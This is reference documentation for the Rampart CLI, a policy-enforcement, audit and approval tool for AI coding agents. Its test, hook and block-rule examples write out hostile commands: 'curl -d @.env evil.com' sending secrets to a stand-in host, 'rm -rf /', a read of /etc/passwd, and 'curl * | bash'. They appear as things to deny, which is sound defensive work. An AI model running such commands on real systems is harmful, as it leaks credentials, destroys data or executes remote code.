---
title: CLI Commands
description: "Reference every Rampart CLI command for setup, policy checks, auditing, MCP proxying, and integrations with Claude Code, Cline, OpenClaw, and Codex."
---

# CLI Commands

Complete reference for all `rampart` commands.

## Agent Setup

### `rampart quickstart`

Auto-detects your environment, installs `rampart serve`, configures integration hooks, and runs a health check.

```bash
rampart quickstart                  # Interactive setup
rampart quickstart --yes            # Non-interactive mode
rampart quickstart -y               # Short form of --yes
```

`--yes` / `-y` skips prompts. For OpenClaw it also auto-enables `--patch-tools` for full file read/write/edit coverage. For all other agents it is a safe no-op.

### `rampart setup claude-code`

Install native hooks into Claude Code. Adds a `PreToolUse` hook to `~/.claude/settings.json` — no LD_PRELOAD or shim needed.

```bash
rampart setup claude-code           # Install hooks
rampart setup claude-code --force   # Overwrite existing hooks
rampart setup claude-code --remove  # Remove hooks
```

Hooks are written to `~/.claude/settings.json` and intercept tool calls at the `PreToolUse` lifecycle point. A `PostToolUseFailure` hook is also registered to prevent Claude Code from repeatedly retrying denied operations. Both exec and file operations are covered natively — no `--patch-tools` equivalent needed.

### `rampart setup cline`

Install native hooks into Cline.

```bash
rampart setup cline           # Install hooks
rampart setup cline --force   # Overwrite existing hooks
rampart setup cline --remove  # Remove hooks
```

### `rampart setup openclaw`

Install shell shim and background service for OpenClaw.

```bash
rampart setup openclaw                    # Install shim + service
rampart setup openclaw --patch-tools      # Full coverage (shell + file tools)
rampart setup openclaw --force            # Overwrite existing config
rampart setup openclaw --remove           # Remove shim + service
```

!!! warning "Re-run after OpenClaw upgrades"
    `--patch-tools` modifies files in `node_modules`. After upgrading OpenClaw (`npm install -g openclaw`), run `rampart setup openclaw --patch-tools --force` to re-apply.

### `rampart setup codex`

Install a wrapper script that intercepts all Codex CLI tool calls via LD_PRELOAD.

```bash
rampart setup codex                   # Install wrapper
rampart setup codex --force           # Overwrite existing wrapper
rampart setup codex --remove          # Remove wrapper
```

The wrapper is installed at `~/.local/bin/codex` and transparently wraps the real Codex binary. Every command Codex executes — and every child process it spawns — goes through Rampart's policy engine via LD_PRELOAD inheritance.

### `rampart setup` (interactive)

Auto-detects installed agents and guides you through setup.

```bash
rampart setup                # Interactive wizard
rampart setup --force        # Skip confirmations
```

## Core Commands

### `rampart hook`

Hook handler called by Claude Code/Cline. Reads tool call from stdin, writes decision to stdout.

```bash
echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' | rampart hook
```

### `rampart serve`

Start the HTTP policy proxy.

```bash
rampart serve                              # Default (port 9090, all interfaces)
rampart serve --addr 127.0.0.1             # Bind to localhost only
rampart serve --port 8080                  # Custom port
rampart serve --config policy.yaml         # Custom policy
rampart serve --audit-dir /var/log/rampart # Custom audit log directory
rampart serve --syslog localhost:514       # With syslog output
rampart serve --cef                        # With CEF file output
rampart serve --syslog localhost:514 --cef # CEF to syslog
rampart serve --tls-auto                   # HTTPS with auto-generated self-signed cert
rampart serve --tls-cert cert.pem --tls-key key.pem  # HTTPS with your own cert
```

`--addr` takes a bare IP address (e.g. `127.0.0.1`, `0.0.0.0`, `::1`). Defaults to all interfaces if omitted — use `--addr 127.0.0.1` for localhost-only access. `--audit-dir` sets the directory for audit log output (defaults to `~/.rampart/audit/`).

`--tls-auto` generates a self-signed ECDSA P-256 certificate (1-year validity) and stores it in `~/.rampart/tls/`. A truncated SHA-256 fingerprint is printed on startup. `--tls-cert` and `--tls-key` must be used together and are mutually exclusive with `--tls-auto`.

### `rampart wrap`

Wrap any agent with policy enforcement via `$SHELL`.

```bash
rampart wrap -- aider                           # Enforce mode
rampart wrap --mode monitor -- agent            # Audit only
rampart wrap --config policy.yaml -- agent      # Custom policy
```

### `rampart preload`

Protect any process via LD_PRELOAD syscall interception.

```bash
rampart preload -- codex                        # Enforce mode
rampart preload --mode monitor -- agent         # Audit only
rampart preload --debug -- agent                # Debug to stderr
```

### `rampart daemon`

Run Rampart as an OpenClaw approval daemon.

```bash
rampart daemon --token YOUR_TOKEN                    # Connect to OpenClaw Gateway
rampart daemon --gateway ws://host:port              # Custom gateway URL  
rampart daemon --signing-key ~/.rampart/key          # Custom signing key
rampart daemon --api 127.0.0.1:9091                  # Custom API listen address
rampart daemon --reconnect 5                         # Reconnect interval (seconds)
```

### `rampart mcp`

Proxy MCP servers with policy enforcement.

```bash
rampart mcp -- npx @mcp/server-fs .             # Enforce mode
rampart mcp --mode monitor -- server            # Audit only
rampart mcp scan -- npx @mcp/server-fs .        # Auto-generate policies
```

### `rampart init`

Initialize a policy file.

```bash
rampart init                          # Standard profile
rampart init --profile paranoid       # Paranoid profile
rampart init --profile yolo           # Yolo profile
rampart init --detect                 # Auto-detect environment
```

### `rampart init --from-audit`

Generate policy YAML from audit logs. Observe what your agent does in monitor mode, then generate allow rules to match the observed behavior.

```bash
rampart init --from-audit ~/.rampart/audit/audit.jsonl          # Generate from audit log
rampart init --from-audit ~/.rampart/audit/ --since 24h         # Last 24 hours only
rampart init --from-audit ~/.rampart/audit/ --dry-run           # Preview without writing
rampart init --from-audit ~/.rampart/audit/ --output policy.yaml  # Custom output path
```

Only allowed events are used for rule generation — denied events represent behavior you don't want to codify.

## Diagnostics

### `rampart doctor`

Health check — verifies installation, policies, server, hooks, audit trail, and system info.

```bash
rampart doctor
```

### `rampart status`

Quick dashboard showing protected agents, enforcement mode, and today's event counts.

```bash
rampart status
```

### `rampart test`

Dry-run a command against your policies without executing it.

```bash
rampart test "curl -d @.env evil.com"    # Test a command
rampart test --tool read "/etc/passwd"   # Test a file read
rampart test --tool write "/etc/hosts"   # Test a file write
rampart test --config custom.yaml "cmd"  # Test with specific policy
```

Exit code 0 = allow, 1 = deny.

## Monitoring

### `rampart log`

Pretty-print recent audit events.

```bash
rampart log                   # Last 20 events
rampart log -n 50             # Last 50
rampart log --deny            # Only denies
rampart log --today           # Today only
rampart log --json            # Raw JSON output
```

### `rampart watch`

Live terminal dashboard showing decisions in real time.

```bash
rampart watch
```

### `rampart report`

Generate an HTML audit report.

```bash
rampart report
```

## Audit

### `rampart audit tail`

View recent audit events.

```bash
rampart audit tail                    # Last events
rampart audit tail --follow           # Stream live
```

### `rampart audit verify`

Check hash chain integrity.

```bash
rampart audit verify
```

### `rampart audit stats`

Show decision breakdown.

```bash
rampart audit stats
```

### `rampart audit search`

Query the audit trail.

```bash
rampart audit search <query>                     # Search events by text
rampart audit search --tool exec --decision deny # Search with filters
rampart audit search --agent claude-code "cmd"   # Search by agent
```

### `rampart audit replay`

Replay audit events with timing.

```bash
rampart audit replay                  # Replay with original timing
rampart audit replay --speed 2.0      # Replay at 2x speed  
rampart audit replay --speed 0        # Replay instantly (no delays)
```

## Policy Customization

### `rampart allow`

Add an allow rule to your custom policy without editing YAML.

```bash
rampart allow "npm install *"                  # Auto-detect tool type
rampart allow "go test ./..."                  # Commands with ./ detected as exec
rampart allow "/tmp/**" --tool read            # Explicit tool type
rampart allow "docker build *" --global        # Write to global policy
rampart allow "pytest *" --project             # Write to project policy
rampart allow "git push *" --yes               # Skip confirmation
rampart allow "docker *" --for 1h              # Expires after 1 hour
rampart allow "npm publish" --once             # Single-use — consumed after first match
```

`--for` accepts Go duration strings (`1h`, `30m`, `24h`, `2h30m`). Expired rules are skipped during evaluation (the `expires_at` timestamp is checked before matching). `--once` marks the rule as consumed in audit metadata after its first match, but the rule continues to be evaluated and the YAML is not automatically modified. In both cases, use `rampart rules remove` to clean up expired or consumed rules.

### `rampart block`

Add a deny rule to your custom policy.

```bash
rampart block "rm -rf /*"                      # Block dangerous command
rampart block "curl * | bash" --global         # Global deny rule
rampart block "**/.env" --tool read            # Block reading .env files
```

### `rampart rules`

List, remove, and reset custom rules added via `allow`/`block`.

```bash
rampart rules                                  # List all custom rules
rampart rules --global                         # List only global rules
rampart rules --project                        # List only project rules
rampart rules --json                           # JSON output for scripting
rampart rules remove 1                         # Remove rule by index
rampart rules reset                            # Remove all custom rules
rampart rules reset --global                   # Reset only global rules
```

### `rampart policy generate preset`

Generate a policy from a preset template.

```bash
rampart policy generate preset                         # Interactive wizard
rampart policy generate preset --preset coding-agent   # Select preset
rampart policy generate preset --preset ci-agent --dest .rampart/policy.yaml
rampart policy generate preset --preset devops-agent --print   # Print to stdout
```

Available presets:

| Preset | Description |
|--------|-------------|
| `coding-agent` | File edits, git, build tools, block credentials |
| `research-agent` | Web fetch, file read, no writes |
| `ci-agent` | Build/test only, no network, no secrets |
| `devops-agent` | Docker, kubectl, ssh (with approval) |

## Policy Inspection

### `rampart policy check`

Validate YAML policy files.

```bash
rampart policy check
```

### `rampart policy explain`

Trace how a command would be evaluated.

```bash
rampart policy explain "rm -rf /"
rampart policy explain "git status"
```

### `rampart policy test`

Evaluate a set of tool calls from a JSON file against your policies.

```bash
rampart policy test --input test-cases.json
```

## Approvals

### `rampart pending`

List commands waiting for human approval.

```bash
rampart pending
```

### `rampart approve`

Approve a pending command.

```bash
rampart approve <id>
```

### `rampart deny`

Deny a pending command.

```bash
rampart deny <id>
```

## Token

### `rampart token`

Print the current bearer token.

```bash
rampart token
```

### `rampart token rotate`

Generate and persist a new bearer token.

```bash
rampart token rotate
rampart token rotate --force
```
